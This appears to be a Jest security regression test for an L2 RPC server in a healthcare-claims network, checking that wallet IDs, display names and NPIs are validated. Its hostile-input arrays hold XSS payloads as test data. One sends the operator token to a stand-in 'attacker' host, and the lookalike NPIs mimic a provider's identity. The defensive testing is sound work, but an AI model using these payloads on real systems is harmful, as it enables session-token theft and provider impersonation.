/*
 * Copyright 2026 Ben Humbert
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * The entity registry keeps only a wallet ID and a display name that every screen can draw — finding A-74, with the
 * name a member's device gives the engine (A-61).
 *
 * What was wrong: l2_registerEntity checked only that walletId, displayName and type were present. A member-role node
 * could register an entity whose wallet ID carried quotes or markup and whose name was any string of any length, and
 * the screens that list wallets drew both (A-73 was one of them). The engine's register-member kept whatever name the
 * device sent, and the operator console placed it in its thread lists and pickers. Found by the security posture check
 * of 2026-10-24, which followed the chain from a member's registration to the operator token (A-74, then A-61).
 *
 * Now l2_registerEntity refuses, for every principal, a wallet ID that is not a field element written in decimal
 * (digits only, no leading zero, below the field modulus) and a display name that is blank, longer than 100
 * characters, or carries a control character, '<' or '>'; register-member refuses such a name before the engine keeps
 * it. Every caller in the code registers a Field's toString() with a seed or configured name, and stays accepted.
 *
 * The review of the fix found more doors into the same registry. l2_submitProof wrote the name and kind sent with a
 * registration proof into it unchecked, for any caller, and the kind decides which provider routes a signer passes
 * (RPC-04). POST /viz/entities wrote whole entities, keys included, past every rule. Both are gone: a proof that brings
 * entityMetadata is refused, and the route no longer exists. Its one caller, the visualizer engine's scenario, posted
 * without a credential, so the route refused it and the scenario never looked at the answer; that dead call is gone
 * too. l2_registerEntity now also refuses a kind the network does not have, a specialty, pharmacy type or group that is
 * not a short line of plain text, and an encryption key that is not 32 bytes of hex; and walletIdError refuses a value
 * longer than any field element before BigInt reads it.
 *
 * A second review found the npi still unchecked. When the operator or the insurer registers a prescriber or a
 * pharmacy, l2_registerEntity also credentials it into the provider registry: it hashed whatever npi came with the
 * registration, of any length the request limit allows (Poseidon over 100,000 characters took about a second), and
 * kept it there for the insurer's provider directory to draw. The npi was then held to the rule the other labels are,
 * before anything hashed it. The same review found seedEntities, a method that wrote whole entities past every rule and
 * that nothing called; it is gone.
 *
 * The review of the A-89 fix found that rule too loose for an npi, in l2_registerEntity and in l2_credentialProvider,
 * which read its npi the same way. '1234567893' with a zero-width space or a space beside it is a short line of plain
 * text that reads on every screen as that NPI, yet it hashes to an npiHash of its own, so the provider registry, which
 * holds one provider to an npiHash, credentialed a second provider under a real provider's NPI. Both methods now hold an
 * npi, when one is given, to npiError (src/security/npi.ts): ten digits, the last the check digit CMS publishes for the
 * NPI. Anything else is refused before it is hashed, and neither registry keeps it; an absent, null or empty npi is
 * still no npi. Every npi the code sends from its own data is one: the seed providers' NPIs, which the provider nodes
 * register and the insurer credentials at boot.
 *
 * A real L2RpcServer on a random port carries every door: the sequencer's RPC, with the operator's bearer and a member
 * node's key registered, its routes, and the engine's register-member against a stand-in service. The node under it
 * answers a proof with a stand-in: what is tested is what the server writes, not whether a proof verifies.
 */
import fs from 'fs';
import path from 'path';
import { Field, MerkleTree, Poseidon } from 'o1js';
import { InMemoryStore } from '../src/storage/local-store.js';
import { WALLET_TREE_HEIGHT } from '../src/wallets/wallet-state.js';
import { L2Node } from '../src/l2/l2-node.js';
import { L2RpcServer, RPC_INVALID_PARAMS } from '../src/l2/l2-rpc-server.js';
import { StateTransitionProof, TransitionOutput } from '../src/engine/state-transition.js';
import { registerInteractiveRoutes } from '../src/adjudication/interactive-routes.js';
import { RegistrationRefused, type AdjudicationService } from '../src/adjudication/interactive-service.js';
import { generateNodeKey } from '../src/security/node-roles.js';
import { signRequest, privateKeyFromSeedHex } from '../src/security/signed-request.js';
import { hashString } from '../src/zkp/hash-utils.js';

jest.setTimeout(60_000);

const OPERATOR = 'operator-token-registry-fields';
const emptyRoot = new MerkleTree(WALLET_TREE_HEIGHT).getRoot();
const member = generateNodeKey('member');
const bearer = { Authorization: `Bearer ${OPERATOR}` };

/** A wallet ID as the network issues one: a Poseidon hash, written by Field.toString(). */
const REAL_WALLET = Poseidon.hash([Field(7), Field(11)]).toString();
const HOSTILE_IDS = ['1" onmouseover="steal()', '<img src=x onerror=steal()>', "1' onfocus='steal()", '', '0x1f', '01', '-1', '+1', '1e3', ' 12', '12 ', '1001\n'];
const HOSTILE_NAMES = ['<img src=x onerror="fetch(`https://attacker/?t=`+localStorage.zkt_operator_token)">', 'Dr. <b>Quill</b>', 'a'.repeat(101), '   ', 'Line one\nLine two', 'Tab\there', 'Null\u0000byte', 'Bell\u0007', 'C1\u0085control'];
/** npiError's two refusals. */
const NOT_AN_NPI = 'npi must be a National Provider Identifier: ten digits';
const WRONG_CHECK_DIGIT = 'npi has the wrong check digit for a National Provider Identifier';

/**
 * What passes on a screen for the NPI `npi`, or for some NPI, and is not one, with npiError's refusal. Each is a short
 * line of plain text, and each hashes to an npiHash other than the NPI's.
 */
function lookalikes(npi: string): Array<[string, string, string]> {
  return [
    ['a zero-width space after it', `${npi}\u200B`, NOT_AN_NPI],
    ['a zero-width space before it', `\u200B${npi}`, NOT_AN_NPI],
    ['a trailing space', `${npi} `, NOT_AN_NPI],
    ['a leading space', ` ${npi}`, NOT_AN_NPI],
    ['a no-break space after it', `${npi}\u00A0`, NOT_AN_NPI],
    ['full-width digits', [...npi].map((d) => String.fromCharCode(0xFF10 + Number(d))).join(''), NOT_AN_NPI],
    ['a wrong check digit', npi.slice(0, 9) + String((Number(npi[9]) + 1) % 10), WRONG_CHECK_DIGIT],
  ];
}

let server: L2RpcServer;
let node: L2Node;
let url: string;
/** The names the stand-in engine was asked to keep, in order. */
const keptNames: string[] = [];

/** Only what register-member calls. The approval and the ledger checks pass; the test is about what reaches the engine. */
function standInService(): AdjudicationService {
  const svc = {
    async registerMemberFromEnrollment(opts: { walletId: string; displayName: string }) {
      if (opts.walletId === '42') throw new RegistrationRefused(403, 'This wallet has no insurer approval: complete enrollment with the insurer first');
      keptNames.push(opts.displayName);
      return { walletId: opts.walletId, displayName: opts.displayName };
    },
    getState() { return { compiled: true, enrolledMembers: [] }; },
  };
  return new Proxy(svc, { get(t, p) { if (p in t) return (t as any)[p]; if (typeof p === 'string' && p !== 'then') throw new Error(`stand-in service has no ${p}`); return undefined; } }) as unknown as AdjudicationService;
}

beforeAll(async () => {
  node = new L2Node({ batchIntervalMs: 999_999, autoSettle: false, nodeId: 'seq-registry-fields' }, new InMemoryStore(), emptyRoot, emptyRoot, Field(0));
  server = new L2RpcServer(node, { port: 0, host: '127.0.0.1', adminToken: OPERATOR, enableSSE: false });
  server.registerNodeKey(member.nodeId, member.publicKeyHex, 'member');
  registerInteractiveRoutes(server, standInService());
  await server.start();
  url = `http://127.0.0.1:${server.getPort()}`;
});

afterAll(async () => { await server.stop(); });

interface RpcReply { error?: { code: number; message: string }; result?: any }

/** l2_registerEntity, signed by the member node's key (`asMember`) or with the operator's bearer. */
async function registerEntity(params: Record<string, unknown>, asMember = true): Promise<RpcReply> {
  const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'l2_registerEntity', params });
  const headers = asMember
    ? signRequest({ signerId: member.nodeId, privateKey: privateKeyFromSeedHex(member.seedHex), method: 'POST', path: '/rpc', body })
    : bearer;
  const r = await fetch(`${url}/rpc`, { method: 'POST', headers: { 'Content-Type': 'application/json', ...headers }, body });
  return await r.json() as RpcReply;
}

/** The sequencer's entity registry, as the operator reads it. */
async function entities(): Promise<Array<Record<string, unknown> & { walletId: string }>> {
  const r = await fetch(`${url}/viz/entities`, { headers: bearer });
  return await r.json() as Array<Record<string, unknown> & { walletId: string }>;
}

/** The wallet IDs in the sequencer's entity registry, as the operator reads them. */
async function registeredIds(): Promise<string[]> {
  return (await entities()).map((e) => e.walletId);
}

/** Any RPC method, called with the operator's bearer. */
async function operatorRpc(method: string, params: Record<string, unknown>): Promise<RpcReply> {
  const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method, params });
  const r = await fetch(`${url}/rpc`, { method: 'POST', headers: { 'Content-Type': 'application/json', ...bearer }, body });
  return await r.json() as RpcReply;
}

/** How many providers the provider registry holds. */
async function providerCount(): Promise<string> {
  return (await operatorRpc('l2_getProviderRegistryRoot', {})).result.providerCount;
}

/** l2_submitProof as any caller sends it: it takes no credential. */
async function submit(params: Record<string, unknown>): Promise<RpcReply> {
  const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'l2_submitProof', params });
  const r = await fetch(`${url}/rpc`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body });
  return await r.json() as RpcReply;
}

async function registerMember(body: Record<string, unknown>): Promise<{ status: number; json: any }> {
  const r = await fetch(`${url}/interactive/register-member`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
  return { status: r.status, json: await r.json().catch(() => null) };
}

describe('what a wallet ID and a display name may be', () => {
  test('the modulus is o1js\'s Field.ORDER', async () => {
    const { FIELD_MODULUS } = await import('../src/security/wallet-id.js');
    expect(FIELD_MODULUS).toBe(Field.ORDER);
  });

  test('a wallet ID is a field element in decimal: digits only, no leading zero, below the modulus', async () => {
    const { walletIdError } = await import('../src/security/wallet-id.js');
    for (const ok of ['0', '1', '1001', '79200000000000000001', REAL_WALLET, (Field.ORDER - 1n).toString()]) {
      expect([ok, walletIdError(ok)]).toEqual([ok, null]);
    }
    for (const bad of [...HOSTILE_IDS, Field.ORDER.toString(), (Field.ORDER + 5n).toString(), '9'.repeat(100)]) {
      expect([bad, walletIdError(bad)]).toEqual([bad, expect.stringMatching(/^walletId must be (a field element written in decimal|less than the field modulus)/)]);
    }
    expect(walletIdError(1001)).toMatch(/field element written in decimal/);   // a number is not how the network writes one
    expect(walletIdError(undefined, 'pcpWalletId')).toMatch(/^pcpWalletId must be/);
  });

  test('a value longer than any field element is refused without being read as a number', async () => {
    const { walletIdError, FIELD_MODULUS } = await import('../src/security/wallet-id.js');
    expect(FIELD_MODULUS.toString().length).toBe(77);                       // so no field element has more digits
    const parsed = jest.spyOn(globalThis, 'BigInt');
    try {
      expect(walletIdError('9'.repeat(100_000))).toBe('walletId must be less than the field modulus');
      expect(walletIdError((FIELD_MODULUS - 1n).toString())).toBeNull();    // 77 digits: read, and below the modulus
      // before: [100000, 77] — BigInt read all 100,000 digits, work that grows faster than the length, per request
      expect(parsed.mock.calls.map(([v]) => String(v).length)).toEqual([77]);
    } finally {
      parsed.mockRestore();
    }
  });

  test('a display name is one short line of plain text: quotes and ampersands are fine, markup and controls are not', async () => {
    const { displayNameError, DISPLAY_NAME_MAX_LENGTH } = await import('../src/security/free-text.js');
    expect(DISPLAY_NAME_MAX_LENGTH).toBe(100);
    for (const ok of ['Member', 'Dr. Avery Quill, MD', "O'Brien & Sons Pharmacy #12", 'Quillfeather Pharmacy #8871', 'a'.repeat(100), 'Zoë Ångström']) {
      expect([ok, displayNameError(ok)]).toEqual([ok, null]);
    }
    for (const bad of HOSTILE_NAMES) expect([bad, displayNameError(bad)]).toEqual([bad, expect.stringMatching(/^displayName /)]);
    expect(displayNameError(42)).toBe('displayName must be text');
    expect(displayNameError('<b>', 'specialty')).toBe('specialty may not contain < or >');
  });
});

describe('what an NPI may be', () => {
  test('every NPI the seed providers carry is one, as the provider nodes register it and the insurer credentials it: ten digits, the last the check digit CMS publishes', async () => {
    const { npiError } = await import('../src/security/npi.js');
    const seed = (file: string): Array<Record<string, any>> => JSON.parse(fs.readFileSync(path.resolve(__dirname, '..', 'src', 'data', file), 'utf8'));
    // The NPI each record lists, and the claim identifier the nodes and the insurer's boot send as its npi.
    const sent = [
      ...seed('prescribers.json').flatMap((p) => [p.npi, p.localData.prescriberId]),
      ...seed('pharmacies.json').flatMap((p) => [p.npi, p.localData.serviceProviderId]),
    ];
    expect(sent.length).toBeGreaterThan(0);
    for (const npi of sent) expect([npi, npiError(npi)]).toEqual([npi, null]);
    for (const npi of ['1234567893', '1245319599']) expect([npi, npiError(npi)]).toEqual([npi, null]);   // the worked example CMS publishes, and another these tests send
  });

  test('a wrong check digit, a space or an invisible character beside the digits, nine or eleven digits, a number and null are not', async () => {
    const { npiError } = await import('../src/security/npi.js');
    const cases: Array<[string, unknown, string]> = [
      ...lookalikes('1234567893'),
      ['a line feed after it', '1234567893\n', NOT_AN_NPI],
      ['nine digits', '123456789', NOT_AN_NPI],
      ['eleven digits', '12345678931', NOT_AN_NPI],
      ['a number', 1234567893, NOT_AN_NPI],
      ['null', null, NOT_AN_NPI],
    ];
    for (const [what, npi, why] of cases) expect([what, npiError(npi)]).toEqual([what, why]);
    // Of the ten numbers 123456789 can end in, only CMS's example has the check digit.
    expect(Array.from({ length: 10 }, (_, d) => `123456789${d}`).filter((n) => npiError(n) === null)).toEqual(['1234567893']);
    expect(npiError(undefined, 'prescriberNpi')).toBe('prescriberNpi must be a National Provider Identifier: ten digits');
  });
});

describe('l2_registerEntity', () => {
  test('refuses a wallet ID that is not a field element in decimal, saying why, and keeps nothing', async () => {
    for (const walletId of HOSTILE_IDS.filter((id) => id !== '')) {
      const r = await registerEntity({ walletId, displayName: 'Mallory', type: 'member' });
      expect([walletId, r.error?.code, r.error?.message]).toEqual([walletId, RPC_INVALID_PARAMS, 'walletId must be a field element written in decimal: digits only, with no leading zero']);   // before: { ok: true }
    }
    const beyond = await registerEntity({ walletId: Field.ORDER.toString(), displayName: 'Mallory', type: 'member' });
    expect(beyond.error?.message).toBe('walletId must be less than the field modulus');
    expect(await registeredIds()).toEqual([]);
  });

  test('refuses a display name with markup, a control character, no text or more than 100 characters', async () => {
    for (const displayName of HOSTILE_NAMES) {
      const r = await registerEntity({ walletId: '1003', displayName, type: 'member' });
      expect([displayName, r.error?.code, r.error?.message]).toEqual([displayName, RPC_INVALID_PARAMS, expect.stringMatching(/^displayName may/)]);   // before: { ok: true }
    }
    expect(await registeredIds()).not.toContain('1003');
  });

  test('holds the operator to the same rule', async () => {
    const r = await registerEntity({ walletId: '2001" onmouseover="x', displayName: 'Dr <i>P</i>', type: 'prescriber' }, false);
    expect(r.error?.code).toBe(RPC_INVALID_PARAMS);
    expect(await registeredIds()).toEqual([]);
  });

  test('registers what every caller sends: a Field\'s decimal string with a seed or configured name', async () => {
    const asNode = await registerEntity({ walletId: REAL_WALLET, displayName: 'Member', type: 'member' });
    expect(asNode.error).toBeUndefined();
    expect(asNode.result).toEqual({ ok: true, walletId: REAL_WALLET, displayName: 'Member', type: 'member' });
    const top = (Field.ORDER - 1n).toString();
    const asOperator = await registerEntity({ walletId: top, displayName: "O'Brien & Sons Pharmacy #12", type: 'pharmacy' }, false);
    expect(asOperator.error).toBeUndefined();
    expect((await registeredIds()).sort()).toEqual([REAL_WALLET, top].sort());
  });

  test('a missing field is still refused as before', async () => {
    const r = await registerEntity({ walletId: '1004', type: 'member' });
    expect(r.error).toBeDefined();
    expect(await registeredIds()).not.toContain('1004');
  });

  test('refuses a kind the network does not have, the operator included', async () => {
    for (const type of ['superuser', 'Insurer', 'member ', '<b>member</b>', 'operator', 7]) {
      const r = await registerEntity({ walletId: '1006', displayName: 'Mallory', type }, false);
      expect([type, r.error?.code, r.error?.message]).toEqual([type, RPC_INVALID_PARAMS, 'type must be one of member, prescriber, pharmacy, insurer, employer, leviathan, worker']);   // before: { ok: true }
    }
    expect(await registeredIds()).not.toContain('1006');
  });

  test('refuses a specialty, pharmacy type or group that is not a short line of plain text', async () => {
    const cases: Array<[string, unknown, string]> = [
      ['group', '<img src=x onerror=steal()>', 'group may not contain < or >'],
      ['group', 'GRP\n1', 'group may not contain control characters'],
      ['specialty', 'Family <b>Medicine</b>', 'specialty may not contain < or >'],
      ['pharmacyType', 'r'.repeat(101), 'pharmacyType may be at most 100 characters'],
      ['group', 7, 'group must be text'],
    ];
    for (const [label, value, why] of cases) {
      const r = await registerEntity({ walletId: '1007', displayName: 'Member', type: 'member', [label]: value });
      expect([label, value, r.error?.code, r.error?.message]).toEqual([label, value, RPC_INVALID_PARAMS, why]);   // before: { ok: true }
    }
    expect(await registeredIds()).not.toContain('1007');
  });

  test('refuses an encryption key that is not 32 bytes of hex', async () => {
    for (const encryptionPublicKeyHex of ['zz'.repeat(32), 'ab'.repeat(31), 'ab'.repeat(33), '"><img src=x>', 42]) {
      const r = await registerEntity({ walletId: '1008', displayName: 'Member', type: 'member', encryptionPublicKeyHex });
      expect([encryptionPublicKeyHex, r.error?.code, r.error?.message]).toEqual([encryptionPublicKeyHex, RPC_INVALID_PARAMS, 'encryptionPublicKeyHex must be 32 bytes (64 hex chars)']);   // before: { ok: true }
    }
    expect(await registeredIds()).not.toContain('1008');
  });

  test('registers what the member and provider nodes send, labels and keys included', async () => {
    const memberWallet = Poseidon.hash([Field(13), Field(17)]).toString();
    const asMember = await registerEntity({
      walletId: memberWallet, displayName: 'Member', type: 'member', group: 'GRP-ACME-001',
      encryptionPublicKeyHex: 'AB'.repeat(32), signingPublicKeyHex: 'cd'.repeat(32),
    });
    expect(asMember.error).toBeUndefined();
    const prescriberWallet = Poseidon.hash([Field(19), Field(23)]).toString();
    const asOperator = await registerEntity({ walletId: prescriberWallet, displayName: 'Dr. Avery Quill, MD', type: 'prescriber', specialty: 'Family Medicine', group: '' }, false);
    expect(asOperator.error).toBeUndefined();
    const listed = await entities();
    expect(listed.find((e) => e.walletId === memberWallet)).toMatchObject({ type: 'member', group: 'GRP-ACME-001', encryptionPublicKeyHex: 'ab'.repeat(32) });
    expect(listed.find((e) => e.walletId === prescriberWallet)).toMatchObject({ type: 'prescriber', specialty: 'Family Medicine' });
  });

  test('refuses an npi that is not a National Provider Identifier before the credentialing hashes it, and writes neither registry; a real NPI still credentials', async () => {
    const prescriber = { displayName: 'Dr. Avery Quill, MD', type: 'prescriber', specialty: 'Family Medicine' };
    const genuine = Poseidon.hash([Field(43), Field(47)]).toString();
    const ok = await registerEntity({ ...prescriber, walletId: genuine, npi: '1245319599' }, false);
    expect(ok.error).toBeUndefined();
    expect(await registeredIds()).toContain(genuine);
    expect((await operatorRpc('l2_getProvider', { walletId: genuine })).result).toMatchObject({ providerType: 'prescriber', npi: '1245319599', credentialStateName: 'active' });
    expect((await operatorRpc('l2_getProviderByNpi', { npiHash: hashString('1245319599').toString() })).result).toMatchObject({ walletId: genuine });

    // Each impostor's npi hashed to a key of its own, which the registry's one-provider-to-an-NPI index let by.
    const providers = await providerCount();
    const impostors: string[] = [];
    for (const [what, npi, why] of lookalikes('1245319599')) {
      const walletId = Poseidon.hash([Field(43), Field(100 + impostors.length)]).toString();
      impostors.push(walletId);
      const r = await registerEntity({ ...prescriber, walletId, npi }, false);
      expect([what, r.error?.code, r.error?.message]).toEqual([what, RPC_INVALID_PARAMS, why]);   // before: { ok: true }, and credentialed beside the genuine provider
    }
    // The plain-text rule refused these already, in its own words; the NPI rule refuses them first.
    const plainTextRefused: Array<[string, string]> = [
      ['101 characters', '1'.repeat(101)],
      ['100,000 characters', '9'.repeat(100_000)],
      ['a newline', '1245319599\n'],
      ['a NUL', '12453\u000019599'],
    ];
    for (const [what, npi] of plainTextRefused) {
      const r = await registerEntity({ ...prescriber, walletId: impostors[0], npi }, false);
      expect([what, r.error?.code, r.error?.message]).toEqual([what, RPC_INVALID_PARAMS, NOT_AN_NPI]);   // before: refused, as 'npi may be at most 100 characters' or 'npi may not contain control characters'
    }
    const listed = await registeredIds();
    for (const walletId of impostors) expect(listed).not.toContain(walletId);                 // before: listed
    expect(await providerCount()).toBe(providers);                                           // before: one provider more for each impostor
    for (const [what, npi] of lookalikes('1245319599')) {
      expect([what, (await operatorRpc('l2_getProviderByNpi', { npiHash: hashString(npi).toString() })).result]).toEqual([what, null]);   // before: the impostor's credential
    }
  });
});

describe('l2_submitProof', () => {
  test('takes no entity metadata: a proof that brings a name and a kind is refused before it is read, and the registry keeps nothing', async () => {
    const SELF = Poseidon.hash([Field(29), Field(31)]).toString();
    const proof = await StateTransitionProof.dummy(undefined, new TransitionOutput({
      walletId: Field(SELF), oldRegistryRoot: emptyRoot, newRegistryRoot: Field(1), oldLifecycleRoot: Field(0), newLifecycleRoot: Field(0),
    }), 0);
    // The node accepts the registration: whether a proof verifies is the verifier's test, not this one.
    const reached: string[] = [];
    const submitProof = node.submitProof;
    node.submitProof = (async (p: StateTransitionProof) => {
      reached.push(p.publicOutput.walletId.toString());
      return { isRegistration: true, walletId: SELF };
    }) as unknown as typeof node.submitProof;
    try {
      const claimed = await submit({ proofJson: proof.toJSON(), entityMetadata: { displayName: 'Acme Health Insurance', type: 'insurer' } });
      // before: accepted, and the new wallet was listed as the insurer "Acme Health Insurance"
      expect(claimed.error).toMatchObject({ code: RPC_INVALID_PARAMS, message: "l2_submitProof takes no entityMetadata: an entity's name and kind are registered with l2_registerEntity" });
      expect(reached).toEqual([]);
      expect(await registeredIds()).not.toContain(SELF);

      const alone = await submit({ proofJson: proof.toJSON() });
      expect(alone.error).toBeUndefined();
      expect(reached).toEqual([SELF]);                                     // a proof alone still reaches the node
      expect(await registeredIds()).not.toContain(SELF);                   // and names no entity
    } finally {
      node.submitProof = submitProof;
    }
  });
});

describe('l2_credentialProvider', () => {
  test('keeps what l2_registerEntity keeps: a wallet ID as the network writes one, and short lines of plain text', async () => {
    const credential = (params: Record<string, unknown>): Promise<RpcReply> => operatorRpc('l2_credentialProvider', params);
    const base = { displayName: 'Dr. Avery Quill, MD', providerType: 'prescriber', npi: '1234567893', specialty: 'Family Medicine', stateOfLicense: 'TX', deaNumber: 'AQ1234563' };
    const NOT_DECIMAL = 'walletId must be a field element written in decimal: digits only, with no leading zero';
    const refused: Array<[Record<string, unknown>, string]> = [
      [{ walletId: '0x1f' }, NOT_DECIMAL],                                  // BigInt reads these; the network writes none of them
      [{ walletId: ' 17' }, NOT_DECIMAL],
      [{ walletId: '1013', displayName: 'Dr <b>Quill</b>' }, 'displayName may not contain < or >'],
      [{ walletId: '1013', deaNumber: 'AQ123\n4563' }, 'deaNumber may not contain control characters'],
      [{ walletId: '1013', specialty: 's'.repeat(101) }, 'specialty may be at most 100 characters'],
    ];
    for (const [over, why] of refused) {
      const r = await credential({ ...base, ...over });
      expect([over, r.error?.code, r.error?.message]).toEqual([over, RPC_INVALID_PARAMS, why]);   // before: credentialed
    }
    const ids = await registeredIds();
    for (const id of ['0x1f', ' 17', '1013']) expect(ids).not.toContain(id);
    const ok = await credential({ ...base, walletId: Poseidon.hash([Field(37), Field(41)]).toString() });
    expect(ok.error).toBeUndefined();
  });

  test('refuses an npi that is not a National Provider Identifier before it is hashed, so none is credentialed beside the provider whose NPI it reads as; a real NPI still credentials', async () => {
    const credential = (params: Record<string, unknown>): Promise<RpcReply> => operatorRpc('l2_credentialProvider', params);
    // The first seed pharmacy, as the insurer credentials it at boot.
    const pharmacy = { displayName: 'Kettleby Pharmacy', providerType: 'pharmacy', pharmacyType: 'Community/Retail', stateOfLicense: 'WI', verificationMethod: 'manual' };
    const genuine = Poseidon.hash([Field(61), Field(67)]).toString();
    const ok = await credential({ ...pharmacy, walletId: genuine, npi: '2999000518' });
    expect(ok.error).toBeUndefined();
    expect(await registeredIds()).toContain(genuine);
    expect((await operatorRpc('l2_getProviderByNpi', { npiHash: hashString('2999000518').toString() })).result).toMatchObject({ walletId: genuine, providerType: 'pharmacy' });

    const providers = await providerCount();
    const impostors: string[] = [];
    for (const [what, npi, why] of lookalikes('2999000518')) {
      const walletId = Poseidon.hash([Field(61), Field(100 + impostors.length)]).toString();
      impostors.push(walletId);
      const r = await credential({ ...pharmacy, walletId, npi });
      expect([what, r.error?.code, r.error?.message]).toEqual([what, RPC_INVALID_PARAMS, why]);   // before: credentialed beside the genuine pharmacy, under an npiHash of its own
    }
    expect(await providerCount()).toBe(providers);                                           // before: one provider more for each impostor
    const listed = await registeredIds();
    for (const walletId of impostors) expect(listed).not.toContain(walletId);                 // before: listed
    for (const walletId of impostors) expect(await operatorRpc('l2_getProvider', { walletId })).toMatchObject({ result: null });   // before: credentialed

    // Written as itself, the NPI is the registry's to refuse, as it always was: one provider to an NPI.
    const twin = await credential({ ...pharmacy, walletId: impostors[0], npi: '2999000518' });
    expect(twin.error?.message).toMatch(/^NPI already registered/);
    // An npi sent as null or empty is no npi, as before: the provider is keyed by its wallet ID.
    for (const [i, npi] of [null, ''].entries()) {
      const walletId = Poseidon.hash([Field(61), Field(200 + i)]).toString();
      expect([npi, (await credential({ ...pharmacy, walletId, npi })).error]).toEqual([npi, undefined]);
    }
    expect(await providerCount()).toBe(String(Number(providers) + 2));
  });
});

describe('POST /viz/entities', () => {
  test('is gone: it wrote whole entities past every rule above, keys included; the visualizer engine\'s scenario posted to it without a credential, was refused, and posts no more', async () => {
    const hostile = [{ walletId: '1009" onmouseover="steal()', displayName: '<img src=x onerror=steal()>', type: 'superuser', signingPublicKeyHex: 'ee'.repeat(32) }];
    const r = await fetch(`${url}/viz/entities`, { method: 'POST', headers: { ...bearer, 'Content-Type': 'application/json' }, body: JSON.stringify(hostile) });
    expect(r.status).toBe(404);                                            // before: 200 { ok: true, count: 1 }
    expect(await registeredIds()).not.toContain(hostile[0].walletId);
  });
});

describe('register-member', () => {
  test('refuses a name with markup, a control character, no text or more than 100 characters before the engine keeps it', async () => {
    keptNames.length = 0;
    for (const displayName of HOSTILE_NAMES) {
      const r = await registerMember({ walletId: '123456789', ownershipProofJson: '{"stand-in":true}', displayName });
      expect([displayName, r.status, r.json?.error]).toEqual([displayName, 400, expect.stringMatching(/^displayName may/)]);   // before: 200, and the engine kept the name
    }
    expect(keptNames).toEqual([]);
  });

  test('keeps a plain name, and names a member with none "Member"', async () => {
    keptNames.length = 0;
    expect((await registerMember({ walletId: '123456789', ownershipProofJson: '{"stand-in":true}', displayName: "Member device 4101 (O'Neil)" })).status).toBe(200);
    expect((await registerMember({ walletId: '123456789', ownershipProofJson: '{"stand-in":true}' })).status).toBe(200);
    expect(keptNames).toEqual(["Member device 4101 (O'Neil)", 'Member']);
  });

  test('its other checks are unchanged: the body first, then the engine\'s approval gate', async () => {
    expect((await registerMember({ walletId: '42' })).status).toBe(400);
    const unapproved = await registerMember({ walletId: '42', ownershipProofJson: '{}', displayName: 'Mallory' });
    expect(unapproved.status).toBe(403);
  });
});
